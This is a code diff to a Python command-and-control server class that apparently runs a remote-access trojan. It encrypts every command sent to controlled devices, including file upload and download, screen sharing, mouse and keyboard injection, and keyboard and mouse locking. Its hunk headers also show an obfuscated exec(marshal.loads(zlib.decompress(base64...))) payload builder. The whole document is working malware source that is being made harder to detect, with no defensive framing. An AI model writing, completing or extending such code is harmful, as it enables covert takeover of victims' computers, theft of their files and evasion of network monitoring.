@@ -173,7 +173,8 @@ class C2:
         return self.total_devices
 
     def send_command(self, sid, data):
-        self.sio.emit("command", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("command", encrypted_data)
 
     def get_result(self, sid, data):
         for device in self.devices:
@@ -371,18 +372,16 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             print("file encoded")
 
         for uid in uids:
-            self.sio.emit(
-                "upload_file",
-                {"uid": uid, "file_name": file.filename, "file": base64_encoded},
-                to=self.devices[uid]["sid"]
-            )
+            encrypted_data = self.keys.encrypt(json.dumps({"uid": uid, "file_name": file.filename, "file": base64_encoded}))
+            self.sio.emit("upload_file", encrypted_data, to=self.devices[uid]["sid"])
 
     def download_file(self, data):
         print(data)
         file_path = data["file_path"]
 
         for uid in data["uids"]:
-            self.sio.emit("download_file", {"uid": uid, "file_path": file_path})
+            encrypted_data = self.keys.encrypt(json.dumps({"uid": uid, "file_path": file_path}))
+            self.sio.emit("download_file", encrypted_data)
 
     def save_file(self, sid, data):
         data = json.loads(decrypt(data))
@@ -412,8 +411,10 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
             'screen_fps': settings['settings']['screen_sharing']['screen_fps'],
             'screen_qualtiy': settings['settings']['screen_sharing']['screen_qualtiy']
         }
-        self.sio.emit("change_screen_information", screen_res_data)
-        self.sio.emit("screen_status", data)
+        encrypted_data = self.keys.encrypt(json.dumps(screen_res_data))
+        self.sio.emit("change_screen_information", encrypted_data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("screen_status", encrypted_data)
 
     def screenshot_taken(self, sid, data):
         print(sid)
@@ -422,43 +423,54 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         self.sio.emit("screenshot", data)
 
     def switch_screen(self, sid, data):
-        self.sio.emit("switch_screen", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("switch_screen", encrypted_data)
 
 
 
     def mouse_input(self, sid ,data):
-        self.sio.emit("mouse_input", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("mouse_input", encrypted_data)
 
     def keyboard_input(self, sid ,data):
-        self.sio.emit("keyboard_input", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("keyboard_input", encrypted_data)
 
     def lock_keyboard(self, sid ,data):
-        self.sio.emit("lock_keyboard", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("lock_keyboard", encrypted_data)
 
     def lock_mouse(self, sid ,data):
-        self.sio.emit("lock_mouse", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("lock_mouse", encrypted_data)
 
 
     def mouse_click(self, sid, data):
-        self.sio.emit("mouse_click", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("mouse_click", encrypted_data)
 
     def mouse_click_right(self, sid, data):
-        self.sio.emit("mouse_click_right", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("mouse_click_right", encrypted_data)
 
     def screen_count(self, sid, data):
         self.sio.emit("screen_count", json.loads(self.keys.decrypt(data)))
 
     def change_screen_number(self, sid, data):
-        self.sio.emit("change_screen_number", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("change_screen_number", encrypted_data)
     
     def mouse_scroll(self, sid, data):
-        self.sio.emit("mouse_scroll", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("mouse_scroll", encrypted_data)
 
     def key_press(self, sid, data):
-        self.sio.emit("key_press", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("key_press", encrypted_data)
 
     def key_press_short(self, sid, data):
-        self.sio.emit("key_press_short", data)
+        encrypted_data = self.keys.encrypt(json.dumps(data))
+        self.sio.emit("key_press_short", encrypted_data)
 
     def recover(self, device_id):
         self.sio.emit("recover", {"uid": device_id})
